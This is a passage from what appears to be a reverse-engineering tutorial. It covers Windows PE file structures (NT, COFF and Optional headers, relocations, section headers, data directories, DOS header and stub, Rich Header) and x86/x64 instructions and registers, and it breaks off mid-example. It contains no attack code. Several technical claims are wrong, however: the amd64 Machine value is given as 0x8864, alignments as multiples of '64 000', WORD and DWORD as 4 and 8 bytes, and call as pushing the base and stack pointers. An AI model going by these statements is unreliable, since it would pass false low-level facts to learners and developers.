<pre><code class="language-cpp">typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
</code></pre>
<p>Both header versions begin with a signature represented by a DWORD. These 4 bytes identify the file as a PE and are always set to <code>0x50450000</code>, or <code>PE\0\0</code> in ASCII. You can view this field in PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Signature.png" alt="" /></p>
<h1 id="coff-file-header"><a class="header" href="#coff-file-header">COFF File Header</a></h1>
<p>Next is the COFF File Header, or the <code>IMAGE_FILE_HEADER</code>, which is again identical in both the 32-bit and 64-bit versions and is defined as follows:</p>
<pre><code class="language-cpp">typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
</code></pre>
<ul>
<li><code>Machine</code> indicates the type of architecture that the PE file is designed to run on. For example, this field will contain <code>0x8864</code> for amd64 and <code>0x14c</code> for i386. For a full list of values you should refer to <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft's documentation</a>.</li>
<li><code>NumberOfSections</code> contains the number of entries in the section table.</li>
<li><code>TimeDateStamp</code> - this field is a Unix timestamp which indicates when the file was created.</li>
<li><code>PointerToSymbolTable</code> and <code>NumberOfSymbols</code> - these fields contain an offset to the COFF symbol table as well as the number of entries inside. Since this table is deprecated, these fields are set to 0.</li>
<li><code>SizeOfOptionalHeader</code> - this field is rather self-explanatory.</li>
<li><code>Characteristics</code> - this is a field for flags that indicate a multitude of things. The meaning of each flag can again be explored on the site of <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft's documentation</a>.</li>
</ul>
<p>You can get a view of the COFF File Header using PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_COFF_File_Header.png" alt="" /></p>
<h1 id="optional-header"><a class="header" href="#optional-header">Optional Header</a></h1>
<p>The Optional Header is crucial to the PE loader and linker on Windows systems. It is called optional because certain files, such as object files, lack such a header. It does not really have a fixed size, hence why the <code>IMAGE_FILE_HEADER.SizeOfOptionalHeader</code> field exists. Furthermore, the Optional Header also comes in two flavours - 32- and 64-bit. These differ in only two aspects - the 32-bit version contains 31 entries, while the 64-bit version has 30, and data types of certain members are different. Namely, the 32-bit version contains a <code>BaseOfData</code> member, which is an RVA to the beginning of the data section, and the fields <code>ImageBase</code>, <code>SizeOfStackReserve</code>, <code>SizeOfStackCommit</code>, <code>SizeOfHeapReserve</code>, <code>SizeOfHeapCommit</code> change from <code>DWORD</code> to <code>ULONGLONG</code> between 32- and 64-bit, respectively. Both structs are defined in <code>&lt;winnt.h&gt;</code>:</p>
<pre><code class="language-cpp">typedef struct _IMAGE_OPTIONAL_HEADER {
    // Standard fields.

    WORD    Magic;
    BYTE    MajorLinkerVersion;
    BYTE    MinorLinkerVersion;
    DWORD   SizeOfCode;
    DWORD   SizeOfInitializedData;
    DWORD   SizeOfUninitializedData;
    DWORD   AddressOfEntryPoint;
    DWORD   BaseOfCode;
    DWORD   BaseOfData;

    // NT additional fields.

    DWORD   ImageBase;
    DWORD   SectionAlignment;
    DWORD   FileAlignment;
    WORD    MajorOperatingSystemVersion;
    WORD    MinorOperatingSystemVersion;
    WORD    MajorImageVersion;
    WORD    MinorImageVersion;
    WORD    MajorSubsystemVersion;
    WORD    MinorSubsystemVersion;
    DWORD   Win32VersionValue;
    DWORD   SizeOfImage;
    DWORD   SizeOfHeaders;
    DWORD   CheckSum;
    WORD    Subsystem;
    WORD    DllCharacteristics;
    DWORD   SizeOfStackReserve;
    DWORD   SizeOfStackCommit;
    DWORD   SizeOfHeapReserve;
    DWORD   SizeOfHeapCommit;
    DWORD   LoaderFlags;
    DWORD   NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
	// Standard fields
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;

	// NT additional fields
	
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
</code></pre>
<p><em>A concept which PE files heavily rely on are RVAs or Relative Virtual Addresses. An RVA represents an offset from the beginning of the Image Base, which is the location where the PE file was loaded into memory. In order to turn an RVA into an absolute address, you need to add the RVA to the image base.</em></p>
<p>The Optional Header begins with a few standard members which are remnants of the COFF file format. The rest of the fields are Microsoft's PE extension.</p>
<p><code>Magic</code> is a field which describes the state of the file. This member is what determines whether the image is 32-bit or 64-bit - <code>IMAGE_FILE_HEADER.Machine</code> is ignored by the Windows PE loader. Three common values for this field are listed by Microsoft:</p>
<div class="table-wrapper"><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody>
<tr><td><code>0x10b</code></td><td>The file is a <code>PE32</code> image.</td></tr>
<tr><td><code>0x20b</code></td><td>The file is a <code>PE32+</code> image.</td></tr>
<tr><td><code>0x107</code></td><td>The file is a ROM image.</td></tr>
</tbody></table>
</div>
<p><code>MajorLinkerVersion</code> and <code>MinorLinkerVersion</code> contain the major and minor versions of the linker used to build the PE file.</p>
<p><code>SizeOfCode</code> holds the size of the code (<code>.text</code>) section, or the sum of the sizes of all code sections, if more than one is present.</p>
<p><code>SizeOfInitializedData</code> contains the size of the initialized data (<code>.data</code>) section, or the sum of the sizes of all initialised data sections, if more than one is present.</p>
<p><code>SizeOfUninitializedData</code> contains the size of the uninitialized data (<code>.bss</code>) section, or the sum of the sizes of all uninitialised data sections, if more than one is present.</p>
<p><code>AddressOfEntryPoint</code> stores an RVA of the file's entry point when loaded into memory. For program images this field points to the starting address and for device drivers it points to an initialisation function. An entry point is optional for DLLs. If an entry point is missing, this field is set to 0.</p>
<p><code>BaseOfCode</code> is an RVA to the start of the code section when the image is loaded into memory.</p>
<p><code>BaseOfData</code> (PE32 only) is only present in 32-bit executables and points to the start of the data section when the image is loaded into memory.</p>
<p><code>ImageBase</code> is a field which holds the preferred load address for the file in memory and must a multiple of 64 000. This field is pretty much always ignored due to a multitude of reasons such as ASLR.</p>
<p><code>SectionAlignment</code> holds the value to which sections are aligned in memory. All sections must be aligned to a multiple of this value. This field defaults to the architecture's page size and cannot be less than <code>FileAlignment</code>. </p>
<p><code>FileAlignment</code> represents the section alignment <em>on disk</em> rather than in memory. If the size of the section data is less than this value, it gets padded with zeros. Only integral powers of 2 are allowed for this value and it should range between 512 and 64 000. </p>
<p><code>MajorOperatingSystemVersion</code>, <code>MinorOperatingSystemVersion</code>, <code>MajorImageVersion</code>, <code>MinorImageVersion</code>, <code>MajorSubsystemVersion</code> and <code>MinorSubsystemVersion</code> specify the major and minor versions for the required operating system, the major and minor versions of the image file, and the major and minor versions of the subsystem to be used.</p>
<p><code>Win32VersionValue</code> is a reserved field which should be set to 0.</p>
<p><code>SizeOfImage</code> represents the number of bytes that the file occupies but is rounded to a multiple of  <code>SectionAlignment</code>.</p>
<p><code>SizeOfHeaders</code> describes the combined size (in bytes) of the DOS Stub, NT Headers, and section headers, rounded to a multiple of <code>FileAlignment</code>.</p>
<p><code>CheckSum</code> is a checksum of the file which is used to validate the PE at load time.</p>
<p><code>Subsystem</code> specifies the Windows subsystem required to run the image.</p>
<p><code>DLLCharacteristics</code> is a flag field and a terrible misnomer, since it is present in all PE files. </p>
<p><code>SizeOfStackReserve</code>, <code>SizeOfStackCommit</code>, <code>SizeOfHeapReserve</code> and <code>SizeOfHeapCommit</code> describe the amount to reserve and commit for the stack and the heap, respectively.</p>
<p><code>LoaderFlags</code> is a reserved field which should be set to 0.</p>
<p><code>NumberOfRvaAndSizes</code> contains the size of the <a href="Reverse%20Engineering/Binary%20Formats/PE/Data%20Directories.html">Data Directories</a> array.</p>
<p><code>DataDirectory</code> is an array of <code>IMAGE_DATA_DIRECTORY</code> structures and is what makes the Optional Header of variable size.</p>
<p>The Optional Header can be inspected by means of PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Optional_Header.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h1>
<p>During compilation, the compiler assumes that the PE file will be loaded at a certain base address, which is stored in <code>IMAGE_OPTIONAL_HEADER.ImageBase</code>. The compiler may take some addresses during compilation and make them absolute by hardcoding them based on the <code>ImageBase</code>. Unfortunately, the file is rarely loaded at its desired image base and so these addresses will be invalidated. Therefore, the linker needs to perform <em>relocations</em> - it needs to fix those absolute addresses based on the actual image base. </p>
<h1 id="the-relocation-table"><a class="header" href="#the-relocation-table">The Relocation Table</a></h1>
<p>A list of these <code>ImageBase</code>-based addresses will be generated and stored in the <em>relocation table</em>. This is a Data Directory within the <code>.reloc</code> section and is divided into blocks, with each block representing the base relocations for a 4KB page and where each block must be aligned to a value of 32.</p>
<p>Each block begins with an <code>IMAGE_BASE_RELOCATION</code> structure and is followed by any number of <em>offset field entries</em>. This struct holds the RVA of the block as well as its size.</p>
<pre><code class="language-cpp">typedef struct _IMAGE_BASE_RELOCATION {

    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
    
} IMAGE_BASE_RELOCATION;
typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
</code></pre>
<p>An offset field entry is represented by a WORD, with the first 4 bits specifying the relocation type (which you can find on <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft's documentation</a>) and the last 12 bits storing an offset from the <code>VirtualAddress</code> field of the corresponding relocation block.</p>
<p>The absolute address of the location that needs fixing then be obtained by adding the page RVA to the preferred image base and then adding the offset of the corresponding relocation (offset field) entry.</p>
<p>Relocations can also be inspected with PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Relocations.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-30"><a class="header" href="#introduction-30">Introduction</a></h1>
<p>Sections are what make up the largest part of the PE file except for all the preceding headers. Some sections have reserved names which describe their purpose. A full list can be found on <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">Microsoft's documentation</a> under &quot;Special Sections&quot;.</p>
<ul>
<li><code>.text</code> stores the programme's executable code.</li>
<li><code>.data</code> contains initialised data.</li>
<li><code>.bss</code> holds uninitialised data.</li>
<li><code>.rdata</code> contains read-only initialised data.</li>
<li><code>.edata</code> holds export tables.</li>
<li><code>.idata</code> stores import tables.</li>
<li><code>.reloc</code> has relocation information.</li>
<li><code>.rsrc</code> contains resources used by the program such as images or icons that are embedded.</li>
<li><code>.tls</code> is thread-local storage.</li>
</ul>
<h1 id="section-header-table"><a class="header" href="#section-header-table">Section Header Table</a></h1>
<p>The section header table lies between the Optional Header and the actual sections. Inside there is one Section Header entry for each section. Section headers are defined as follows in <code>&lt;winnt.h&gt;</code>:</p>
<pre><code class="language-cpp">// Section header format.

#define IMAGE_SIZEOF_SHORT_NAME              8

typedef struct _IMAGE_SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
            DWORD   PhysicalAddress;
            DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
</code></pre>
<p><code>Name</code> is a byte array which holds the section name. Due to its size, section names are limited to 8 characters in length, however, it is possible to circumvent this in non-executable PEs by using a string table.</p>
<p><code>Misc</code> - <code>PhysicalAddress</code> or <code>VirtualSize</code>, is a union field, meaning that it is either one or the other of its member fields. It represents the total size of the section when loaded into memory.</p>
<p>For executable images, <code>VirtualAddress</code> holds the offset from the beginning of the image to the beginning of the section in memory. For object files it contains the address of the section before relocations are applied.</p>
<p><code>SizeOfRawData</code> stores the size of the section <em>on disk</em> and may be different from <code>VirtualSize</code>. This field must a multiple of <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>. If the section size is less than this value, then the section gets padded and this field is rounded to <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>. However, upon loading into memory, the section no longer is required to obey the file alignment and so only its contents are loaded. Therefore, <code>SizeOfRawData</code> will be less than <code>VirtualSize</code>. It is possible for the opposite to happen as well. For example, no space will be allocated on disk for uninitialised data, however, the section will be expanded during load-time to reserve space for this data.</p>
<p><code>PointerToRawData</code> is a pointer to the first page of the section. For executables, it must be a multiple of <code>IMAGE_OPTIONAL_HEADER.FileAlignment</code>.</p>
<p><code>PointerToRelocations</code> is a pointer to the beginning of the relocations for this section. For executables, this is set to 0.</p>
<p><code>PointerToLineNumbers</code> is pointer to the beginning of COFF line-number entries for the section. Since COFF debugging information is deprecated, this field holds 0.</p>
<p><code>NumberOfRelocations</code> stores the number of relocation entries for this section and is set to 0 for executable images.</p>
<p><code>NumberOfLinenumbers</code> is another deprecated field, which stores 0, and represents the number of COFF line-number entries for the section.</p>
<p><code>Characteristics</code> is a flags field which describes things like whether the section contains executable code, initialised/uninitialised data, etc.</p>
<p>The section headers can be inspected with PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Section_Headers.png" alt="" /></p>
<p>Here, <code>Raw Addr</code> and <code>Virtual Addr</code> correspond to the <code>IMAGE_SECTION_HEADER.PointerToRawData</code> and <code>IMAGE_SECTION_HEADER.VirtualAddress</code> fields, respectively. <code>Raw Size</code> and <code>Virtual Size</code> correspond to <code>IMAGE_SECTION_HEADER.SizeOfRawData</code> and <code>IMAGE_SECTION_HEADER.VirtualSize</code>. The <code>Characteristics</code> fields gives us information about whether the section is read-only, writable, executable, etc.</p>
<h1 id="data-directories"><a class="header" href="#data-directories">Data Directories</a></h1>
<p>Data Directories represent pieces of data located within the sections of the PE file and contain information useful to the programme loader. They are simples structs defined in <code>&lt;winnt.h&gt;</code>:</p>
<pre><code class="language-cpp">typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
</code></pre>
<p>The first member, <code>VirtualAddress</code> is an RVA pointing to the beginning of the Data Directory, while <code>Size</code> holds the number of bytes that the Data Directory occupies. While this is true of all Data Directories, each Data Directory is handled differently based on its type:</p>
<pre><code class="language-cpp">// Directory Entries

#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
</code></pre>
<p>The above are values represent the indices for the Optional Header's <code>DataDirectory</code> array at which each type of Data Directory is located.</p>
<p>If both the <code>VirtualAddress</code> and <code>Size</code> fields are set to 0, then this particular Data Directory is unused. </p>
<p>Data Directories can be inspected under the Optional Header with PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Data_Directories.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-31"><a class="header" href="#introduction-31">Introduction</a></h1>
<p>The DOS header is a 64-byte struct located at the beginning of a PE file. It is mainly a legacy structure and so most of its fields are only relevant to MS-DOS. The ones pertinent to PE files are  <code>e_magic</code> and <code>e_lfanew</code>. The following struct is defined in <code>&lt;winnt.h&gt;</code></p>
<pre><code class="language-cpp">typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // File address of new exe header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
</code></pre>
<p><code>e_magic</code> is a word, occupying 2 bytes, which identifies the file as an MS-DOS executable and always contains the value <code>0x5a4d</code>, or <code>MZ</code> in ASCII.</p>
<p><code>e_lfanew</code> is located at an offset of <code>0x3c</code> from the start of the DOS header and holds an offset to the beginning of the NT headers, which is paramount to the PE loader on Windows. </p>
<p>The DOS header of a PE file can be inspected with PE-Bear:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_DOS_Header.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-32"><a class="header" href="#introduction-32">Introduction</a></h1>
<p>Immediately following the <a href="Reverse%20Engineering/Binary%20Formats/PE/The%20DOS%20Header.html">DOS header</a> is the DOS Stub. This is a tiny portion of executable instructions which get executed instead of the programme when run in DOS mode. Its purpose is to print an error message that the programme cannot be run in DOS mode. It is possible to also alter the message displayed.</p>
<p>We can analyse the DOS stub with a disassembler:</p>
<pre><code class="language-asm">0x0000000000000000:  0E                   push  cs  
0x0000000000000001:  1F                   pop   ds  
0x0000000000000002:  BA 0E 00             mov   dx, 0xe  
0x0000000000000005:  B4 09                mov   ah, 9  
0x0000000000000007:  CD 21                int   0x21
0x0000000000000009:  B8 01 4C             mov   ax, 0x4c01  
0x000000000000000c:  CD 21                int   0x21
</code></pre>
<p>The first two instructions set the code and data segments to the same value. Next, <code>mov dx, 0xe</code> moves the address, <code>0xe</code>, of the string containing the error message into <code>dx</code>. The error message follows right after the stub instructions. At <code>0x7</code>, interrupt <code>0x21</code> is invoked and its function is determined by the value that was moved into <code>ah</code> - in this case it will print a message. At the end, the same interrupt is invoked but this time with a different argument - <code>0x4c01</code>. This ultimately tells the programme to exit with an error code of 1.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-33"><a class="header" href="#introduction-33">Introduction</a></h1>
<p>This chunk of data is NOT part of a typical PE file. It is an undocumented structure which is only found in files built with the Visual Studio Toolset. It is located immediately after the DOS stub and before the NT headers and serves the purpose of outlining the Visual Studio tools and versions that were used to build the PE file. It is possible to completely zero out this part of the PE file without affecting it.</p>
<p>The Rich Header comprises a chunk of XOR-encrypted data. It begins with a signature, <code>DanS</code>, followed by three zero-ed DWORDs used for padding. Next are entries containing information about the Visual Studio tools used in the build process of the PE file. The entries are represented by DWORD pairs, where the high word of the first DWORD stores the product or type ID and the low word contains the build ID. The second DWORD is used for storing the use count for each tool. </p>
<p>At the end of the header is another signature, <code>Rich</code>, followed by a checksum. The checksum field is what serves as the XOR key.</p>
<p>The Rich Header is automatically parsed by PE-Bear and can be easily inspected:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/PE/Resources/Images/PE_Rich_Header.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-34"><a class="header" href="#introduction-34">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="program-anatomy"><a class="header" href="#program-anatomy">Program Anatomy</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="instructions"><a class="header" href="#instructions">Instructions</a></h1>
<p>Each program is comprised of a set of instructions which tell the CPU what operations it needs to perform. Different CPU architectures make use of different instruction sets, however, all of them boil down to two things - an opertation code (opcode) and optional data that the instruction operates with. These are all represented using bits - 1s and 0s.</p>
<h3 id="mov"><a class="header" href="#mov"><code>mov</code></a></h3>
<p>Moves the value inside one register to another:</p>
<pre><code>mov rax, rdx
</code></pre>
<h3 id="lea"><a class="header" href="#lea"><code>lea</code></a></h3>
<p>Load effective address - this instruction calculates the address of its second operand and moves it into its first operand:</p>
<pre><code>lea rdx, [rax+0x10]
</code></pre>
<p>This will move <code>rax+0x10</code> inside <code>rdx</code>.</p>
<h3 id="add"><a class="header" href="#add"><code>add</code></a></h3>
<p>This instruction adds its operands and stores the result in its first operand:</p>
<pre><code>add rax, rdx
</code></pre>
<h3 id="sub"><a class="header" href="#sub"><code>sub</code></a></h3>
<p>This instruction subtracts the second operand from the first and stores the result in its first operand</p>
<pre><code>sub rax, 0x9
</code></pre>
<h3 id="xor"><a class="header" href="#xor"><code>xor</code></a></h3>
<p>It performs XOR-ing on its operands and stores the results into the first operand:</p>
<pre><code>xor rdx, rax
</code></pre>
<p>The <code>and</code> and <code>or</code> are the same, but instead perform a binary <code>AND</code> and a binary <code>OR</code> operation, respectively.</p>
<h3 id="push"><a class="header" href="#push"><code>push</code></a></h3>
<p>Decreases the stack pointer (grows the stack) by 8 (4 on x86) bytes and stores the contents of its operand on the stack:</p>
<pre><code>push rax
</code></pre>
<h3 id="pop"><a class="header" href="#pop"><code>pop</code></a></h3>
<p>Increases the stack pointer (shrinks the stack) by 8 (4 on x86) bytes and stores the popped value from the stack into its operand:</p>
<pre><code>pop rax
</code></pre>
<h3 id="jmp"><a class="header" href="#jmp"><code>jmp</code></a></h3>
<p>Jumps to the address specified - used for redirecting code execution:</p>
<pre><code>jmp 0x6A2B10
</code></pre>
<h3 id="call"><a class="header" href="#call"><code>call</code></a></h3>
<p>Used for invoking procedures. It first pushes the values of the base and stack pointers onto the stack and then jumps to the specified address. After the function is finished, a <code>ret</code> instruction is issued which restores the values of the stack and base pointers from the stack and continues execution from where it left off.</p>
<h3 id="cmp"><a class="header" href="#cmp"><code>cmp</code></a></h3>
<p>It compares the value of its two operands and sets the according flags depending on the result:</p>
<pre><code>cmp rax, rdx
</code></pre>
<p>If <code>rax</code> &lt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 1.</p>
<p>If <code>rax</code> &gt; <code>rdx</code>, the zero flag is set to 0 and the carry flag is set to 0.</p>
<p>If <code>rax</code> = <code>rdx</code>, the zero flag is set to 1 and the carry flag is set to 0.</p>
<h3 id="jz--jnz"><a class="header" href="#jz--jnz"><code>jz</code> / <code>jnz</code></a></h3>
<p><code>jump-if-zero</code> and <code>jump-if-not-zero</code> execute depending on the state of the zero flag.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="registers"><a class="header" href="#registers">Registers</a></h1>
<p>Registers are value containers which reside on the CPU and not in RAM. They are small in size and some have special purposes. You may store both addresses and values in registers and depending on the instruction used the data inside will be interpreted in a different way - this is commonly called an <em>addressing mode</em>.</p>
<p>In x86 Intel assembly (i386), the registers are 32 bits (4 bytes) in size and some of them are reserved:</p>
<p><code>ebp</code> - the base pointer, points to the bottom of the current stack frame</p>
<p><code>esp</code> - the stack pointer, points to the top of the current stack frame</p>
<p><code>eip</code> - the instruction pointer, points to the next instruction to be executed</p>
<p>The other registers are general purpose registers and can be used for anything you like:
<code>eax</code>, <code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>.</p>
<p>x64 AMD assembly (amd64) extends these 32-bit registers to 64-bit ones and denotes these new versions by replacing the initial <code>e</code> with an <code>r</code>: <code>rbp</code>, <code>rsp</code>, <code>rip</code>, <code>rax</code>, ... It is important to note that these are <em>not</em> different registers - <code>eax</code> and <code>rax</code> refer to the same space on the CPU, however, <code>eax</code> only provides access to the lower 32 bits of the 64-bit register. You can also get access to the lower 16 and 8 bits of the register using different names:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">8 Byte Register</th><th style="text-align: center">Lower 4 Bytes</th><th style="text-align: center">Lower 2 Bytes</th><th style="text-align: center">Lower Byte</th></tr></thead><tbody>
<tr><td style="text-align: center">rbp</td><td style="text-align: center">ebp</td><td style="text-align: center">bp</td><td style="text-align: center">bpl</td></tr>
<tr><td style="text-align: center">rsp</td><td style="text-align: center">esp</td><td style="text-align: center">sp</td><td style="text-align: center">spl</td></tr>
<tr><td style="text-align: center">rip</td><td style="text-align: center">eip</td><td style="text-align: center"></td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">rax</td><td style="text-align: center">eax</td><td style="text-align: center">ax</td><td style="text-align: center">al</td></tr>
<tr><td style="text-align: center">rbx</td><td style="text-align: center">ebx</td><td style="text-align: center">bx</td><td style="text-align: center">bl</td></tr>
<tr><td style="text-align: center">rcx</td><td style="text-align: center">ecx</td><td style="text-align: center">cx</td><td style="text-align: center">cl</td></tr>
<tr><td style="text-align: center">rdx</td><td style="text-align: center">edx</td><td style="text-align: center">dx</td><td style="text-align: center">dl</td></tr>
<tr><td style="text-align: center">rsi</td><td style="text-align: center">esi</td><td style="text-align: center">si</td><td style="text-align: center">sil</td></tr>
<tr><td style="text-align: center">rdi</td><td style="text-align: center">edi</td><td style="text-align: center">di</td><td style="text-align: center">dil</td></tr>
<tr><td style="text-align: center">r8</td><td style="text-align: center">r8d</td><td style="text-align: center">r8w</td><td style="text-align: center">r8b</td></tr>
<tr><td style="text-align: center">r9</td><td style="text-align: center">r9d</td><td style="text-align: center">r9w</td><td style="text-align: center">r9b</td></tr>
<tr><td style="text-align: center">r10</td><td style="text-align: center">r10d</td><td style="text-align: center">r10w</td><td style="text-align: center">r10b</td></tr>
<tr><td style="text-align: center">r11</td><td style="text-align: center">r11d</td><td style="text-align: center">r11w</td><td style="text-align: center">r11b</td></tr>
<tr><td style="text-align: center">r12</td><td style="text-align: center">r12d</td><td style="text-align: center">r12w</td><td style="text-align: center">r12b</td></tr>
<tr><td style="text-align: center">r13</td><td style="text-align: center">r13d</td><td style="text-align: center">r13w</td><td style="text-align: center">r13b</td></tr>
<tr><td style="text-align: center">r14</td><td style="text-align: center">r14d</td><td style="text-align: center">r14w</td><td style="text-align: center">r14b</td></tr>
<tr><td style="text-align: center">r15</td><td style="text-align: center">r15d</td><td style="text-align: center">r15w</td><td style="text-align: center">r15b</td></tr>
</tbody></table>
</div>
<p>Each row contains names which refer to different parts of the <em>same</em> register. Note, you cannot access the lower 16 or 8 bits of the instruction pointer.</p>
<p>You might sometimes see <code>WORD</code> or <code>DWORD</code> being used in a similar context - <code>WORD</code> means 4 bytes and <code>DWORD</code> means 8 bytes.</p>
<h2 id="register-use-in-x64-linux"><a class="header" href="#register-use-in-x64-linux">Register Use in x64 Linux</a></h2>
<p>Under x64 Linux, function arguments are passed via registers:</p>
<pre><code>rdi:    First Argument
rsi:    Second Argument
rdx:    Third Argument
rcx:    Fourth Argument
r8:     Fifth Argument
r9:     Sixth Argument
</code></pre>
<p>The return value is store in <code>rax</code> (<code>eax</code> on 32-bit machines).</p>
<h2 id="register-dereferencing"><a class="header" href="#register-dereferencing">Register Dereferencing</a></h2>
<p>Register dereferencing occurs when the value of the register is treated as an address to the actual data to be used, rather than the data itself. This means that addressed can be stored in registers and used later - this is useful when dealing with large data sizes.</p>
<p>For example,</p>
